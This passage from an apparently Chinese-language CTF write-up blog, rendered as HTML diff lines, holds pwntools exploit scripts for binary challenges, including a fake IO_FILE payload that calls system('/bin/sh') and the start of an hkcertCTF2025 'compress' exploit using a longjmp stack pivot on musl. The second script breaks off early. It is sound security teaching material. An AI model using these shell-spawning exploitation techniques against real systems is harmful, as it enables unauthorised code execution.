+</span></span><span class="line"><span class="cl"><span class="c1"># calloc to edit stdout 2 IO_attack</span>
+</span></span><span class="line"><span class="cl"><span class="n">cho</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="s1">&#39;name size: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x28</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sa</span><span class="p">(</span><span class="s1">&#39;name: &#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="s1">&#39;note size: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span><span class="c1">#sc为8</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>                       <span class="c1"># flags</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                               <span class="c1"># rpos</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                               <span class="c1"># rend</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="mh">0x5c9a0</span><span class="p">)</span>              <span class="c1"># close</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                               <span class="c1"># wend</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                               <span class="c1"># wpos</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                               <span class="c1"># mustbezero_1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                               <span class="c1"># wbase</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                               <span class="c1"># read</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_IO</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libcbase_true</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>  <span class="c1"># write</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##z()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">fake_IO</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># find bbase 0x1685</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># bbase 0x178c</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># bbase 0x1798</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h2 class="heading-element" id="hkcertctf2025-_-compress"><span>hkcertCTF2025 _ compress</span>
+  <a href="#hkcertctf2025-_-compress" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>musl v1.1.24</code></p>
+<p>有个<code>gadget</code>可以进行栈迁移：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-asm"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">x</span><span class="err">/</span><span class="mi">20</span><span class="no">i</span> <span class="mi">0x49503</span><span class="err">+</span><span class="mi">0x7ffff7c00000</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c49503</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c49506</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c4950a</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">r12</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c4950e</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">r13</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c49512</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">r14</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c49516</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">r15</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x28</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c4951a</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x30</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c4951e</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">rsp</span><span class="p">,</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x7ffff7c49521</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x38</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7c49525</span> <span class="err">&lt;</span><span class="no">longjmp</span><span class="err">+</span><span class="mi">45</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">jmp</span>    <span class="no">rdx</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>打<code>io_file</code></p>
+<p><code>show</code>泄露出libc，add通过负数偏移，能写libc中的内容</p>
+<p>写<code>stdin</code>，<code>stdout</code>不能动，接着往下写rop，栈迁移进行rop</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-py"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># address = &#39;./pwn_patched&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ss</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lgaddr</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>		        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>			        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">ir64</span>    <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> \
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    c
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;host.docker.internal&#34;</span><span class="p">,</span><span class="mi">9999</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p, gdbscript=gdbscript)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;调用 add 函数
+</span></span></span><span class="line"><span class="cl"><span class="s2">    offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞）
+</span></span></span><span class="line"><span class="cl"><span class="s2">    content: 要写入的内容
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input the offset:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input the Content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;调用 show 函数&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">r64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x282e50</span> <span class="o">-</span> <span class="mh">0x10000</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c49503 &lt;longjmp+11&gt;: mov    rbx,QWORD PTR [rdi]</span>
